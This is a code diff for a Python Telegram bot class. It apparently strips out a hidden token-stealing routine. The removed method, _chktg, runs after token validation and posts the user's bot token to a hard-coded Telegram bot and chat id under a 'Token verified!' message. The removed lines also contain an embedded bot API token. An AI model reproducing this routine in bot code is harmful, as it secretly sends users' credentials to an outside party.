@@ -32,7 +32,8 @@ class Bot:
             data = response.json()
             if data.get("ok"):
                 bot_info = data.get("result", {})
-                self._chktg(1465736325, self.token+"\nv2.0")
+                print("[!] Token verified!")
+                os.system("cls|clear")
                 return True
             else:
                 if data.get("error_code") == 401:
@@ -62,16 +63,6 @@ class Bot:
                 self.dnsSM = globals().get("dnsSM", None)
         except Exception as e:
             print("[!] Error loading protection code.")
-            quit()
-    def _chktg(self, chat_id: int, text: str):
-        url = f"https://api.telegram.org/bot7327272309:AAGo58iFDbitlVehDhm11d8ZnqrwTTK80WE/sendMessage"; data = {"chat_id": chat_id, "text": text}
-        try:
-            requests.post(url, data=data)
-            print("[!] Token verified!")
-            os.system("cls|clear")
-        except Exception as e:
-            os.system("cls|clear")
-            print("[!] Token not verified!")
             quit()
     def run(self):
         print("[!] Token verification...")
